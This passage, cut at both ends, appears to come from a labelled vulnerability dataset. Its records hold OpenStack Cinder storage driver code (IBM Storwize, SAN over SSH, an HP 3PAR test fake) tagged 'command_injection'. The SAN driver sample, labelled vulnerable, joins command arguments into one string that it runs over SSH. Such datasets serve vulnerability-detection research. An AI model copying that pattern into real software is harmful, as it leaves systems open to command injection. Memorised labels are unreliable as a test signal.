'target': target})\n\n        fc_map_id = self._make_fc_map(source, target, full_copy)\n        try:\n            self._prepare_fc_map(fc_map_id, source, target)\n            self._start_fc_map(fc_map_id, source, target)\n        except Exception:\n            with excutils.save_and_reraise_exception():\n                self._delete_vdisk(target, True)\n\n        LOG.debug(_('leave: _run_flashcopy: FlashCopy started from '\n                    '%(source)s to %(target)s') %\n                  {'source': source, 'target': target})\n\n    def _create_copy(self, src_vdisk, tgt_vdisk, full_copy, opts, src_id,\n                     from_vol):\n        \"\"\"Create a new snapshot using FlashCopy.\"\"\"\n\n        LOG.debug(_('enter: _create_copy: snapshot %(tgt_vdisk)s from '\n                    'vdisk %(src_vdisk)s') %\n                  {'tgt_vdisk': tgt_vdisk, 'src_vdisk': src_vdisk})\n\n        src_vdisk_attributes = self._get_vdisk_attributes(src_vdisk)\n        if src_vdisk_attributes is None:\n            exception_msg = (\n                _('_create_copy: Source vdisk %s does not exist')\n                % src_vdisk)\n            LOG.error(exception_msg)\n            if from_vol:\n                raise exception.VolumeNotFound(exception_msg,\n                                               volume_id=src_id)\n            else:\n                raise exception.SnapshotNotFound(exception_msg,\n                                                 snapshot_id=src_id)\n\n        self._driver_assert(\n            'capacity' in src_vdisk_attributes,\n            _('_create_copy: cannot get source vdisk '\n              '%(src)s capacity from vdisk attributes '\n              '%(attr)s')\n            % {'src': src_vdisk,\n               'attr': src_vdisk_attributes})\n\n        src_vdisk_size = src_vdisk_attributes['capacity']\n        self._create_vdisk(tgt_vdisk, src_vdisk_size, 'b', opts)\n        self._run_flashcopy(src_vdisk, tgt_vdisk, full_copy)\n\n        LOG.debug(_('leave: _create_copy: snapshot %(tgt_vdisk)s from '\n                    'vdisk %(src_vdisk)s') %\n                  {'tgt_vdisk': tgt_vdisk, 'src_vdisk': src_vdisk})\n\n    def _get_flashcopy_mapping_attributes(self, fc_map_id):\n        LOG.debug(_('enter: _get_flashcopy_mapping_attributes: mapping %s')\n                  % fc_map_id)\n\n        fc_ls_map_cmd = ['svcinfo', 'lsfcmap', '-filtervalue',\n                         'id=%s' % fc_map_id, '-delim', '!']\n        out, err = self._run_ssh(fc_ls_map_cmd)\n        if not len(out.strip()):\n            return None\n\n        # Get list of FlashCopy mappings\n        # We expect zero or one line if mapping does not exist,\n        # two lines if it does exist, otherwise error\n        lines = out.strip().split('\\n')\n        self._assert_ssh_return(len(lines) <= 2,\n                                '_get_flashcopy_mapping_attributes',\n                                fc_ls_map_cmd, out, err)\n\n        if len(lines) == 2:\n            attributes = self._get_hdr_dic(lines[0], lines[1], '!')\n        else:  # 0 or 1 lines\n            attributes = None\n\n        LOG.debug(_('leave: _get_flashcopy_mapping_attributes: mapping '\n                    '%(fc_map_id)s, attributes %(attributes)s') %\n                  {'fc_map_id': fc_map_id, 'attributes': attributes})\n\n        return attributes\n\n    def _is_vdisk_defined(self, vdisk_name):\n        \"\"\"Check if vdisk is defined.\"\"\"\n        LOG.debug(_('enter: _is_vdisk_defined: vdisk %s ') % vdisk_name)\n        vdisk_attributes = self._get_vdisk_attributes(vdisk_name)\n        LOG.debug(_('leave: _is_vdisk_defined: vdisk %(vol)s with %(str)s ')\n                  % {'vol': vdisk_name,\n                     'str': vdisk_attributes is not None})\n        if vdisk_attributes is None:\n            return False\n        else:\n            return True\n\n    def _ensure_vdisk_no_fc_mappings(self, name, allow_snaps=True):\n        # Ensure vdisk has no FlashCopy mappings\n        mapping_ids = self._get_vdisk_fc_mappings(name)\n        while len(mapping_ids):\n            wait_for_copy = False\n            for map_id in mapping_ids:\n                attrs = self._get_flashcopy_mapping_attributes(map_id)\n                if not attrs:\n                    continue\n                source = attrs['source_vdisk_name']\n                target = attrs['target_vdisk_name']\n                copy_rate = attrs['copy_rate']\n                status = attrs['status']\n\n                if copy_rate == '0':\n                    # Case #2: A vdisk that has snapshots\n                    if source == name:\n                        if not allow_snaps:\n                            return False\n                        ssh_cmd = ['svctask', 'chfcmap', '-copyrate', '50',\n                                   '-autodelete', 'on', map_id]\n                        out, err = self._run_ssh(ssh_cmd)\n                        wait_for_copy = True\n                    # Case #3: A snapshot\n                    else:\n                        msg = (_('Vdisk %(name)s not involved in '\n                                 'mapping %(src)s -> %(tgt)s') %\n                               {'name': name, 'src': source, 'tgt': target})\n                        self._driver_assert(target == name, msg)\n                        if status in ['copying', 'prepared']:\n                            self._run_ssh(['svctask', 'stopfcmap', map_id])\n                        elif status in ['stopping', 'preparing']:\n                            wait_for_copy = True\n                        else:\n                            self._run_ssh(['svctask', 'rmfcmap', '-force',\n                                           map_id])\n                # Case 4: Copy in progress - wait and will autodelete\n                else:\n                    if status == 'prepared':\n                        self._run_ssh(['svctask', 'stopfcmap', map_id])\n                        self._run_ssh(['svctask', 'rmfcmap', '-force', map_id])\n                    elif status == 'idle_or_copied':\n                        # Prepare failed\n                        self._run_ssh(['svctask', 'rmfcmap', '-force', map_id])\n                    else:\n                        wait_for_copy = True\n            if wait_for_copy:\n                time.sleep(5)\n            mapping_ids = self._get_vdisk_fc_mappings(name)\n        return True\n\n    def _delete_vdisk(self, name, force):\n        \"\"\"Deletes existing vdisks.\n\n        It is very important to properly take care of mappings before deleting\n        the disk:\n        1. If no mappings, then it was a vdisk, and can be deleted\n        2. If it is the source of a flashcopy mapping and copy_rate is 0, then\n           it is a vdisk that has a snapshot.  If the force flag is set,\n           delete the mapping and the vdisk, otherwise set the mapping to\n           copy and wait (this will allow users to delete vdisks that have\n           snapshots if/when the upper layers allow it).\n        3. If it is the target of a mapping and copy_rate is 0, it is a\n           snapshot, and we should properly stop the mapping and delete.\n        4. If it is the source/target of a mapping and copy_rate is not 0, it\n           is a clone or vdisk created from a snapshot.  We wait for the copy\n           to complete (the mapping will be autodeleted) and then delete the\n           vdisk.\n\n        \"\"\"\n\n        LOG.debug(_('enter: _delete_vdisk: vdisk %s') % name)\n\n        # Try to delete volume only if found on the storage\n        vdisk_defined = self._is_vdisk_defined(name)\n        if not vdisk_defined:\n            LOG.info(_('warning: Tried to delete vdisk %s but it does not '\n                       'exist.') % name)\n            return\n\n        self._ensure_vdisk_no_fc_mappings(name)\n\n        ssh_cmd = ['svctask', 'rmvdisk', '-force', name]\n        if not force:\n            ssh_cmd.remove('-force')\n        out, err = self._run_ssh(ssh_cmd)\n        # No output should be returned from rmvdisk\n        self._assert_ssh_return(len(out.strip()) == 0,\n                                ('_delete_vdisk %(name)s')\n                                % {'name': name},\n                                ssh_cmd, out, err)\n        LOG.debug(_('leave: _delete_vdisk: vdisk %s') % name)\n\n    def create_volume(self, volume):\n        opts = self._get_vdisk_params(volume['volume_type_id'])\n        return self._create_vdisk(volume['name'], str(volume['size']), 'gb',\n                                  opts)\n\n    def delete_volume(self, volume):\n        self._delete_vdisk(volume['name'], False)\n\n    def create_snapshot(self, snapshot):\n        source_vol = self.db.volume_get(self._context, snapshot['volume_id'])\n        opts = self._get_vdisk_params(source_vol['volume_type_id'])\n        self._create_copy(src_vdisk=snapshot['volume_name'],\n                          tgt_vdisk=snapshot['name'],\n                          full_copy=False,\n                          opts=opts,\n                          src_id=snapshot['volume_id'],\n                          from_vol=True)\n\n    def delete_snapshot(self, snapshot):\n        self._delete_vdisk(snapshot['name'], False)\n\n    def create_volume_from_snapshot(self, volume, snapshot):\n        if volume['size'] != snapshot['volume_size']:\n            exception_message = (_('create_volume_from_snapshot: '\n                                   'Source and destination size differ.'))\n            raise exception.VolumeBackendAPIException(data=exception_message)\n\n        opts = self._get_vdisk_params(volume['volume_type_id'])\n        self._create_copy(src_vdisk=snapshot['name'],\n                          tgt_vdisk=volume['name'],\n                          full_copy=True,\n                          opts=opts,\n                          src_id=snapshot['id'],\n                          from_vol=False)\n\n    def create_cloned_volume(self, tgt_volume, src_volume):\n        if src_volume['size'] != tgt_volume['size']:\n            exception_message = (_('create_cloned_volume: '\n                                   'Source and destination size differ.'))\n            raise exception.VolumeBackendAPIException(data=exception_message)\n\n        opts = self._get_vdisk_params(tgt_volume['volume_type_id'])\n        self._create_copy(src_vdisk=src_volume['name'],\n                          tgt_vdisk=tgt_volume['name'],\n                          full_copy=True,\n                          opts=opts,\n                          src_id=src_volume['id'],\n                          from_vol=True)\n\n    def extend_volume(self, volume, new_size):\n        LOG.debug(_('enter: extend_volume: volume %s') % volume['id'])\n        ret = self._ensure_vdisk_no_fc_mappings(volume['name'],\n                                                allow_snaps=False)\n        if not ret:\n            exception_message = (_('extend_volume: Extending a volume with '\n                                   'snapshots is not supported.'))\n            raise exception.VolumeBackendAPIException(data=exception_message)\n\n        extend_amt = int(new_size) - volume['size']\n        ssh_cmd = (['svctask', 'expandvdisksize', '-size', str(extend_amt),\n                    '-unit', 'gb', volume['name']])\n        out, err = self._run_ssh(ssh_cmd)\n        # No output should be returned from expandvdisksize\n        self._assert_ssh_return(len(out.strip()) == 0, 'extend_volume',\n                                ssh_cmd, out, err)\n        LOG.debug(_('leave: extend_volume: volume %s') % volume['id'])\n\n    \"\"\"=====================================================================\"\"\"\n    \"\"\" MISC/HELPERS                                                        \"\"\"\n    \"\"\"=====================================================================\"\"\"\n\n    def get_volume_stats(self, refresh=False):\n        \"\"\"Get volume stats.\n\n        If we haven't gotten stats yet or 'refresh' is True,\n        run update the stats first.\n        \"\"\"\n        if not self._stats or refresh:\n            self._update_volume_stats()\n\n        return self._stats\n\n    def _update_volume_stats(self):\n        \"\"\"Retrieve stats info from volume group.\"\"\"\n\n        LOG.debug(_(\"Updating volume stats\"))\n        data = {}\n\n        data['vendor_name'] = 'IBM'\n        data['driver_version'] = '1.1'\n        data['storage_protocol'] = list(self._enabled_protocols)\n\n        data['total_capacity_gb'] = 0  # To be overwritten\n        data['free_capacity_gb'] = 0   # To be overwritten\n        data['reserved_percentage'] = 0\n        data['QoS_support'] = False\n\n        pool = self.configuration.storwize_svc_volpool_name\n        #Get storage system name\n        ssh_cmd = ['svcinfo', 'lssystem', '-delim', '!']\n        attributes = self._execute_command_and_parse_attributes(ssh_cmd)\n        if not attributes or not attributes['name']:\n            exception_message = (_('_update_volume_stats: '\n                                   'Could not get system name'))\n            raise exception.VolumeBackendAPIException(data=exception_message)\n\n        backend_name = self.configuration.safe_get('volume_backend_name')\n        if not backend_name:\n            backend_name = '%s_%s' % (attributes['name'], pool)\n        data['volume_backend_name'] = backend_name\n\n        ssh_cmd = ['svcinfo', 'lsmdiskgrp', '-bytes', '-delim', '!', pool]\n        attributes = self._execute_command_and_parse_attributes(ssh_cmd)\n        if not attributes:\n            LOG.error(_('Could not get pool data from the storage'))\n            exception_message = (_('_update_volume_stats: '\n                                   'Could not get storage pool data'))\n            raise exception.VolumeBackendAPIException(data=exception_message)\n\n        data['total_capacity_gb'] = (float(attributes['capacity']) /\n                                    (1024 ** 3))\n        data['free_capacity_gb'] = (float(attributes['free_capacity']) /\n                                    (1024 ** 3))\n        data['easytier_support'] = attributes['easy_tier'] in ['on', 'auto']\n        data['compression_support'] = self._compression_enabled\n\n        self._stats = data\n\n    def _port_conf_generator(self, cmd):\n        ssh_cmd = cmd + ['-delim', '!']\n        out, err = self._run_ssh(ssh_cmd)\n\n        if not len(out.strip()):\n            return\n        port_lines = out.strip().split('\\n')\n        if not len(port_lines):\n            return\n\n        header = port_lines.pop(0)\n        yield header\n        for portip_line in port_lines:\n            try:\n                port_data = self._get_hdr_dic(header, portip_line, '!')\n            except exception.VolumeBackendAPIException:\n                with excutils.save_and_reraise_exception():\n                    self._log_cli_output_error('_port_conf_generator',\n                                               ssh_cmd, out, err)\n            yield port_data\n\n    def _check_vdisk_opts(self, opts):\n        # Check that rsize is either -1 or between 0 and 100\n        if not (opts['rsize'] >= -1 and opts['rsize'] <= 100):\n            raise exception.InvalidInput(\n                reason=_('Illegal value specified for storwize_svc_vol_rsize: '\n                         'set to either a percentage (0-100) or -1'))\n\n        # Check that warning is either -1 or between 0 and 100\n        if not (opts['warning'] >= -1 and opts['warning'] <= 100):\n            raise exception.InvalidInput(\n                reason=_('Illegal value specified for '\n                         'storwize_svc_vol_warning: '\n                         'set to a percentage (0-100)'))\n\n        # Check that grainsize is 32/64/128/256\n        if opts['grainsize'] not in [32, 64, 128, 256]:\n            raise exception.InvalidInput(\n                reason=_('Illegal value specified for '\n                         'storwize_svc_vol_grainsize: set to either '\n                         '32, 64, 128, or 256'))\n\n        # Check that compression is supported\n        if opts['compression'] and not self._compression_enabled:\n            raise exception.InvalidInput(\n                reason=_('System does not support compression'))\n\n        # Check that rsize is set if compression is set\n        if opts['compression'] and opts['rsize'] == -1:\n            raise exception.InvalidInput(\n                reason=_('If compression is set to True, rsize must '\n                         'also be set (not equal to -1)'))\n\n        # Check that the requested protocol is enabled\n        if opts['protocol'] not in self._enabled_protocols:\n            raise exception.InvalidInput(\n                reason=_('Illegal value %(prot)s specified for '\n                         'storwize_svc_connection_protocol: '\n                         'valid values are %(enabled)s')\n                % {'prot': opts['protocol'],\n                   'enabled': ','.join(self._enabled_protocols)})\n\n        # Check that multipath is only enabled for fc\n        if opts['protocol'] != 'FC' and opts['multipath']:\n            raise exception.InvalidInput(\n                reason=_('Multipath is currently only supported for FC '\n                         'connections and not iSCSI.  (This is a Nova '\n                         'limitation.)'))\n\n    def _execute_command_and_parse_attributes(self, ssh_cmd):\n        \"\"\"Execute command on the Storwize/SVC and parse attributes.\n\n        Exception is raised if the information from the system\n        can not be obtained.\n\n        \"\"\"\n\n        LOG.debug(_('enter: _execute_command_and_parse_attributes: '\n                    ' command %s') % str(ssh_cmd))\n\n        try:\n            out, err = self._run_ssh(ssh_cmd)\n        except exception.ProcessExecutionError as e:\n            # Didn't get details from the storage, return None\n            LOG.error(_('CLI Exception output:\\n command: %(cmd)s\\n '\n                        'stdout: %(out)s\\n stderr: %(err)s') %\n                      {'cmd': ssh_cmd,\n                       'out': e.stdout,\n                       'err': e.stderr})\n            return None\n\n        self._assert_ssh_return(len(out),\n                                '_execute_command_and_parse_attributes',\n                                ssh_cmd, out, err)\n        attributes = {}\n        for attrib_line in out.split('\\n'):\n            # If '!' not found, return the string and two empty strings\n            attrib_name, foo, attrib_value = attrib_line.partition('!')\n            if attrib_name is not None and len(attrib_name.strip()):\n                attributes[attrib_name] = attrib_value\n\n        LOG.debug(_('leave: _execute_command_and_parse_attributes:\\n'\n                    'command: %(cmd)s\\n'\n                    'attributes: %(attr)s')\n                  % {'cmd': str(ssh_cmd),\n                     'attr': str(attributes)})\n\n        return attributes\n\n    def _get_hdr_dic(self, header, row, delim):\n        \"\"\"Return CLI row data as a dictionary indexed by names from header.\n        string. The strings are converted to columns using the delimiter in\n        delim.\n        \"\"\"\n\n        attributes = header.split(delim)\n        values = row.split(delim)\n        self._driver_assert(\n            len(values) ==\n            len(attributes),\n            _('_get_hdr_dic: attribute headers and values do not match.\\n '\n              'Headers: %(header)s\\n Values: %(row)s')\n            % {'header': str(header),\n               'row': str(row)})\n        dic = dict((a, v) for a, v in map(None, attributes, values))\n        return dic\n\n    def _log_cli_output_error(self, function, cmd, out, err):\n        LOG.error(_('%(fun)s: Failed with unexpected CLI output.\\n '\n                    'Command: %(cmd)s\\nstdout: %(out)s\\nstderr: %(err)s\\n')\n                  % {'fun': function, 'cmd': cmd,\n                     'out': str(out), 'err': str(err)})\n\n    def _driver_assert(self, assert_condition, exception_message):\n        \"\"\"Internal assertion mechanism for CLI output.\"\"\"\n        if not assert_condition:\n            LOG.error(exception_message)\n            raise exception.VolumeBackendAPIException(data=exception_message)\n\n    def _assert_ssh_return(self, test, fun, ssh_cmd, out, err):\n        self._driver_assert(\n            test,\n            _('%(fun)s: Failed with unexpected CLI output.\\n '\n              'Command: %(cmd)s\\n stdout: %(out)s\\n stderr: %(err)s')\n            % {'fun': fun,\n               'cmd': ssh_cmd,\n               'out': str(out),\n               'err': str(err)})\n\n    def _handle_keyerror(self, function, header):\n        msg = (_('Did not find expected column in %(fun)s: %(hdr)s') %\n               {'fun': function, 'hdr': header})\n        LOG.error(msg)\n        raise exception.VolumeBackendAPIException(\n            data=msg)\n\n\nclass CLIResponse(object):\n    '''Parse SVC CLI output and generate iterable'''\n\n    def __init__(self, raw, delim='!', with_header=True):\n        super(CLIResponse, self).__init__()\n        self.raw = raw\n        self.delim = delim\n        self.with_header = with_header\n        self.result = self._parse()\n\n    def select(self, *keys):\n        for a in self.result:\n            vs = []\n            for k in keys:\n                v = a.get(k, None)\n                if isinstance(v, basestring):\n                    v = [v]\n                if isinstance(v, list):\n                    vs.append(v)\n            for item in zip(*vs):\n                yield item\n\n    def __getitem__(self, key):\n        return self.result[key]\n\n    def __iter__(self):\n        for a in self.result:\n            yield a\n\n    def __len__(self):\n        return len(self.result)\n\n    def _parse(self):\n        def get_reader(content, delim):\n            for line in content.lstrip().splitlines():\n                line = line.strip()\n                if line:\n                    yield line.split(delim)\n                else:\n                    yield []\n\n        if isinstance(self.raw, basestring):\n            stdout, stderr = self.raw, ''\n        else:\n            stdout, stderr = self.raw\n        reader = get_reader(stdout, self.delim)\n        result = []\n\n        if self.with_header:\n            hds = tuple()\n            for row in reader:\n                hds = row\n                break\n            for row in reader:\n                cur = dict()\n                for k, v in zip(hds, row):\n                    CLIResponse.append_dict(cur, k, v)\n                result.append(cur)\n        else:\n            cur = dict()\n            for row in reader:\n                if row:\n                    CLIResponse.append_dict(cur, row[0], ' '.join(row[1:]))\n                elif cur:  # start new section\n                    result.append(cur)\n                    cur = dict()\n            if cur:\n                result.append(cur)\n        return result\n\n    @staticmethod\n    def append_dict(dict_, key, value):\n        key, value = key.strip(), value.strip()\n        obj = dict_.get(key, None)\n        if obj is None:\n            dict_[key] = value\n        elif isinstance(obj, list):\n            obj.append(value)\n            dict_[key] = obj\n        else:\n            dict_[key] = [obj, value]\n        return dict_\n/n/n/n", "label": 0, "vtype": "command_injection"}, {"id": "f752302d181583a95cf44354aea607ce9d9283f4", "code": "/cinder/volume/drivers/san/san.py/n/n# vim: tabstop=4 shiftwidth=4 softtabstop=4\n\n# Copyright 2011 Justin Santa Barbara\n# All Rights Reserved.\n#\n#    Licensed under the Apache License, Version 2.0 (the \"License\"); you may\n#    not use this file except in compliance with the License. You may obtain\n#    a copy of the License at\n#\n#         http://www.apache.org/licenses/LICENSE-2.0\n#\n#    Unless required by applicable law or agreed to in writing, software\n#    distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT\n#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the\n#    License for the specific language governing permissions and limitations\n#    under the License.\n\"\"\"\nDefault Driver for san-stored volumes.\n\nThe unique thing about a SAN is that we don't expect that we can run the volume\ncontroller on the SAN hardware.  We expect to access it over SSH or some API.\n\"\"\"\n\nimport random\n\nfrom eventlet import greenthread\nfrom oslo.config import cfg\n\nfrom cinder import exception\nfrom cinder.openstack.common import excutils\nfrom cinder.openstack.common import log as logging\nfrom cinder import utils\nfrom cinder.volume import driver\n\nLOG = logging.getLogger(__name__)\n\nsan_opts = [\n    cfg.BoolOpt('san_thin_provision',\n                default=True,\n                help='Use thin provisioning for SAN volumes?'),\n    cfg.StrOpt('san_ip',\n               default='',\n               help='IP address of SAN controller'),\n    cfg.StrOpt('san_login',\n               default='admin',\n               help='Username for SAN controller'),\n    cfg.StrOpt('san_password',\n               default='',\n               help='Password for SAN controller',\n               secret=True),\n    cfg.StrOpt('san_private_key',\n               default='',\n               help='Filename of private key to use for SSH authentication'),\n    cfg.StrOpt('san_clustername',\n               default='',\n               help='Cluster name to use for creating volumes'),\n    cfg.IntOpt('san_ssh_port',\n               default=22,\n               help='SSH port to use with SAN'),\n    cfg.BoolOpt('san_is_local',\n                default=False,\n                help='Execute commands locally instead of over SSH; '\n                     'use if the volume service is running on the SAN device'),\n    cfg.IntOpt('ssh_conn_timeout',\n               default=30,\n               help=\"SSH connection timeout in seconds\"),\n    cfg.IntOpt('ssh_min_pool_conn',\n               default=1,\n               help='Minimum ssh connections in the pool'),\n    cfg.IntOpt('ssh_max_pool_conn',\n               default=5,\n               help='Maximum ssh connections in the pool'),\n]\n\nCONF = cfg.CONF\nCONF.register_opts(san_opts)\n\n\nclass SanDriver(driver.VolumeDriver):\n    \"\"\"Base class for SAN-style storage volumes\n\n    A SAN-style storage value is 'different' because the volume controller\n    probably won't run on it, so we need to access is over SSH or another\n    remote protocol.\n    \"\"\"\n\n    def __init__(self, *args, **kwargs):\n        execute = kwargs.pop('execute', self.san_execute)\n        super(SanDriver, self).__init__(execute=execute,\n                                        *args, **kwargs)\n        self.configuration.append_config_values(san_opts)\n        self.run_local = self.configuration.san_is_local\n        self.sshpool = None\n\n    def san_execute(self, *cmd, **kwargs):\n        if self.run_local:\n            return utils.execute(*cmd, **kwargs)\n        else:\n            check_exit_code = kwargs.pop('check_exit_code', None)\n            command = ' '.join(cmd)\n            return self._run_ssh(command, check_exit_code)\n\n    def _run_ssh(self, command, check_exit_code=True, attempts=1):\n        if not self.sshpool:\n            password = self.configuration.san_password\n            privatekey = self.configuration.san_private_key\n            min_size = self.configuration.ssh_min_pool_conn\n            max_size = self.configuration.ssh_max_pool_conn\n            self.sshpool = utils.SSHPool(self.configuration.san_ip,\n                                         self.configuration.san_ssh_port,\n                                         self.configuration.ssh_conn_timeout,\n                                         self.configuration.san_login,\n                                         password=password,\n                                         privatekey=privatekey,\n                                         min_size=min_size,\n                                         max_size=max_size)\n        last_exception = None\n        try:\n            total_attempts = attempts\n            with self.sshpool.item() as ssh:\n                while attempts > 0:\n                    attempts -= 1\n                    try:\n                        return utils.ssh_execute(\n                            ssh,\n                            command,\n                            check_exit_code=check_exit_code)\n                    except Exception as e:\n                        LOG.error(e)\n                        last_exception = e\n                        greenthread.sleep(random.randint(20, 500) / 100.0)\n                try:\n                    raise exception.ProcessExecutionError(\n                        exit_code=last_exception.exit_code,\n                        stdout=last_exception.stdout,\n                        stderr=last_exception.stderr,\n                        cmd=last_exception.cmd)\n                except AttributeError:\n                    raise exception.ProcessExecutionError(\n                        exit_code=-1,\n                        stdout=\"\",\n                        stderr=\"Error running SSH command\",\n                        cmd=command)\n\n        except Exception:\n            with excutils.save_and_reraise_exception():\n                LOG.error(_(\"Error running SSH command: %s\") % command)\n\n    def ensure_export(self, context, volume):\n        \"\"\"Synchronously recreates an export for a logical volume.\"\"\"\n        pass\n\n    def create_export(self, context, volume):\n        \"\"\"Exports the volume.\"\"\"\n        pass\n\n    def remove_export(self, context, volume):\n        \"\"\"Removes an export for a logical volume.\"\"\"\n        pass\n\n    def check_for_setup_error(self):\n        \"\"\"Returns an error if prerequisites aren't met.\"\"\"\n        if not self.run_local:\n            if not (self.configuration.san_password or\n                    self.configuration.san_private_key):\n                raise exception.InvalidInput(\n                    reason=_('Specify san_password or san_private_key'))\n\n        # The san_ip must always be set, because we use it for the target\n        if not self.configuration.san_ip:\n            raise exception.InvalidInput(reason=_(\"san_ip must be set\"))\n\n\nclass SanISCSIDriver(SanDriver, driver.ISCSIDriver):\n    def __init__(self, *args, **kwargs):\n        super(SanISCSIDriver, self).__init__(*args, **kwargs)\n\n    def _build_iscsi_target_name(self, volume):\n        return \"%s%s\" % (self.configuration.iscsi_target_prefix,\n                         volume['name'])\n/n/n/n", "label": 1, "vtype": "command_injection"}, {"id": "c55589b131828f3a595903f6796cb2d0babb772f", "code": "cinder/tests/test_hp3par.py/n/n#!/usr/bin/env python\n# vim: tabstop=4 shiftwidth=4 softtabstop=4\n#\n#    (c) Copyright 2013 Hewlett-Packard Development Company, L.P.\n#    All Rights Reserved.\n#\n#    Licensed under the Apache License, Version 2.0 (the \"License\"); you may\n#    not use this file except in compliance with the License. You may obtain\n#    a copy of the License at\n#\n#         http://www.apache.org/licenses/LICENSE-2.0\n#\n#    Unless required by applicable law or agreed to in writing, software\n#    distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT\n#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the\n#    License for the specific language governing permissions and limitations\n#    under the License.\n\"\"\"\nUnit tests for OpenStack Cinder volume drivers\n\"\"\"\nimport ast\nimport mox\nimport shutil\nimport tempfile\n\nfrom hp3parclient import exceptions as hpexceptions\n\nfrom cinder import exception\nfrom cinder.openstack.common import log as logging\nfrom cinder import test\nfrom cinder.volume import configuration as conf\nfrom cinder.volume.drivers.san.hp import hp_3par_fc as hpfcdriver\nfrom cinder.volume.drivers.san.hp import hp_3par_iscsi as hpdriver\n\nLOG = logging.getLogger(__name__)\n\nHP3PAR_DOMAIN = 'OpenStack',\nHP3PAR_CPG = 'OpenStackCPG',\nHP3PAR_CPG_SNAP = 'OpenStackCPGSnap'\nCLI_CR = '\\r\\n'\n\n\nclass FakeHP3ParClient(object):\n\n    api_url = None\n    debug = False\n\n    volumes = []\n    hosts = []\n    vluns = []\n    cpgs = [\n        {'SAGrowth': {'LDLayout': {'diskPatterns': [{'diskType': 2}]},\n                      'incrementMiB': 8192},\n         'SAUsage': {'rawTotalMiB': 24576,\n                     'rawUsedMiB': 768,\n                     'totalMiB': 8192,\n                     'usedMiB': 256},\n         'SDGrowth': {'LDLayout': {'RAIDType': 4,\n                      'diskPatterns': [{'diskType': 2}]},\n                      'incrementMiB': 32768},\n         'SDUsage': {'rawTotalMiB': 49152,\n                     'rawUsedMiB': 1023,\n                     'totalMiB': 36864,\n                     'usedMiB': 768},\n         'UsrUsage': {'rawTotalMiB': 57344,\n                      'rawUsedMiB': 43349,\n                      'totalMiB': 43008,\n                      'usedMiB': 32512},\n         'additionalStates': [],\n         'degradedStates': [],\n         'domain': HP3PAR_DOMAIN,\n         'failedStates': [],\n         'id': 5,\n         'name': HP3PAR_CPG,\n         'numFPVVs': 2,\n         'numTPVVs': 0,\n         'state': 1,\n         'uuid': '29c214aa-62b9-41c8-b198-543f6cf24edf'}]\n\n    def __init__(self, api_url):\n        self.api_url = api_url\n        self.volumes = []\n        self.hosts = []\n        self.vluns = []\n\n    def debug_rest(self, flag):\n        self.debug = flag\n\n    def login(self, username, password, optional=None):\n        return None\n\n    def logout(self):\n        return None\n\n    def getVolumes(self):\n        return self.volumes\n\n    def getVolume(self, name):\n        if self.volumes:\n            for volume in self.volumes:\n                if volume['name'] == name:\n                    return volume\n\n        msg = {'code': 'NON_EXISTENT_HOST',\n               'desc': \"VOLUME '%s' was not found\" % name}\n        raise hpexceptions.HTTPNotFound(msg)\n\n    def createVolume(self, name, cpgName, sizeMiB, optional=None):\n        new_vol = {'additionalStates': [],\n                   'adminSpace': {'freeMiB': 0,\n                                  'rawReservedMiB': 384,\n                                  'reservedMiB': 128,\n                                  'usedMiB': 128},\n                   'baseId': 115,\n                   'comment': optional['comment'],\n                   'copyType': 1,\n                   'creationTime8601': '2012-10-22T16:37:57-07:00',\n                   'creationTimeSec': 1350949077,\n                   'degradedStates': [],\n                   'domain': HP3PAR_DOMAIN,\n                   'failedStates': [],\n                   'id': 115,\n                   'name': name,\n                   'policies': {'caching': True,\n                                'oneHost': False,\n                                'staleSS': True,\n                                'system': False,\n                                'zeroDetect': False},\n                   'provisioningType': 1,\n                   'readOnly': False,\n                   'sizeMiB': sizeMiB,\n                   'snapCPG': optional['snapCPG'],\n                   'snapshotSpace': {'freeMiB': 0,\n                                     'rawReservedMiB': 683,\n                                     'reservedMiB': 512,\n                                     'usedMiB': 512},\n                   'ssSpcAllocLimitPct': 0,\n                   'ssSpcAllocWarningPct': 0,\n                   'state': 1,\n                   'userCPG': cpgName,\n                   'userSpace': {'freeMiB': 0,\n                                 'rawReservedMiB': 41984,\n                                 'reservedMiB': 31488,\n                                 'usedMiB': 31488},\n                   'usrSpcAllocLimitPct': 0,\n                   'usrSpcAllocWarningPct': 0,\n                   'uuid': '1e7daee4-49f4-4d07-9ab8-2b6a4319e243',\n                   'wwn': '50002AC00073383D'}\n        self.volumes.append(new_vol)\n        return None\n\n    def deleteVolume(self, name):\n        volume = self.getVolume(name)\n        self.volumes.remove(volume)\n\n    def createSnapshot(self, name, copyOfName, optional=None):\n        new_snap = {'additionalStates': [],\n                    'adminSpace': {'freeMiB': 0,\n                                   'rawReservedMiB': 0,\n                                   'reservedMiB': 0,\n                                   'usedMiB': 0},\n                    'baseId': 342,\n                    'comment': optional['comment'],\n                    'copyOf': copyOfName,\n                    'copyType': 3,\n                    'creationTime8601': '2012-11-09T15:13:28-08:00',\n                    'creationTimeSec': 1352502808,\n                    'degradedStates': [],\n                    'domain': HP3PAR_DOMAIN,\n                    'expirationTime8601': '2012-11-09T17:13:28-08:00',\n                    'expirationTimeSec': 1352510008,\n                    'failedStates': [],\n                    'id': 343,\n                    'name': name,\n                    'parentId': 342,\n                    'policies': {'caching': True,\n                                 'oneHost': False,\n                                 'staleSS': True,\n                                 'system': False,\n                                 'zeroDetect': False},\n                    'provisioningType': 3,\n                    'readOnly': True,\n                    'retentionTime8601': '2012-11-09T16:13:27-08:00',\n                    'retentionTimeSec': 1352506407,\n                    'sizeMiB': 256,\n                    'snapCPG': HP3PAR_CPG_SNAP,\n                    'snapshotSpace': {'freeMiB': 0,\n                                      'rawReservedMiB': 0,\n                                      'reservedMiB': 0,\n                                      'usedMiB': 0},\n                    'ssSpcAllocLimitPct': 0,\n                    'ssSpcAllocWarningPct': 0,\n                    'state': 1,\n                    'userCPG': HP3PAR_CPG,\n                    'userSpace': {'freeMiB': 0,\n                                  'rawReservedMiB': 0,\n                                  'reservedMiB': 0,\n                                  'usedMiB': 0},\n                    'usrSpcAllocLimitPct': 0,\n                    'usrSpcAllocWarningPct': 0,\n                    'uuid': 'd7a40b8f-2511-46a8-9e75-06383c826d19',\n                    'wwn': '50002AC00157383D'}\n        self.volumes.append(new_snap)\n        return None\n\n    def deleteSnapshot(self, name):\n        volume = self.getVolume(name)\n        self.volumes.remove(volume)\n\n    def createCPG(self, name, optional=None):\n        cpg = {'SAGrowth': {'LDLayout': 